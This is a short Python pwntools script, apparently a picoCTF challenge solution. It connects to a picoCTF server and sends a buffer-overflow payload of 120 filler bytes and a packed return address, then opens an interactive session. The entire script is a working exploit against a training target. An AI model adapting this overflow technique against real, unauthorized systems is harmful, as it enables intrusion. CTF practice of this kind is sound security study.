from pwn import *

r = remote("saturn.picoctf.net", 65355)

payload = b'a'*120 + p32(0x5655630d)
r.sendline(payload)
r.interactive()